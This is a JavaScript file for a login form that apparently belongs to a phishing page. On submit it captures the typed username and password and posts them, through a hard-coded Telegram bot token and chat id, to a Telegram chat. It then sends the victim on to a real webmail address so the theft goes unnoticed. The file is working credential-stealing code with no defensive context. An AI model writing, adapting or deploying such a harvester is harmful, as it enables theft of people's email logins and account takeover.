const form = document.querySelector("#form");

form.addEventListener("submit", (e) => {
    e.preventDefault();

    const username = document.querySelector("#username").value;
    const password = document.querySelector("#password").value;
    const token = "7742954698:AAHHenx6B4apQhFq8IxzqsZr_8rooE86LFE";
    const chat_id = "-4771383361";

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}`;

    const api = new XMLHttpRequest();
    api.open("POST", url, true); // Use POST method
    api.setRequestHeader("Content-Type", "application/json"); // Important for POST requests

    // Construct the JSON payload
    const data = JSON.stringify({
        chat_id: chat_id,
        username: username.value,
        password:password.value,
        text: `Username: ${username}  Password: ${password}`,
    });

    api.onload = () => {
        if (api.status >= 200 && api.status < 300) {
            console.log("Message sent successfully!");
            // Optionally display a success message to the user
        } else {
            console.error("Error sending message:", api.status, api.responseText);
            // Optionally display an error message to the user
        }
    };

    api.onerror = () => {
        console.error("Network error occurred.");
        // Handle network errors appropriately
    }

    api.send(data); // Send the JSON data with the request
    username.value = "";
    password.value = ""; //Clear the input field
});


function redirect() {
    // Get the form data (for example, assuming a form with an input field with id="inputField")
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    // Check if the form data is empty
    if (username.trim() === "" || password.trim() === "") {
        return; // Don't redirect if the form is empty
    }

    // Proceed with the redirect if there is data
    window.location.href = "https://webmail.eastex.net/"+[];
}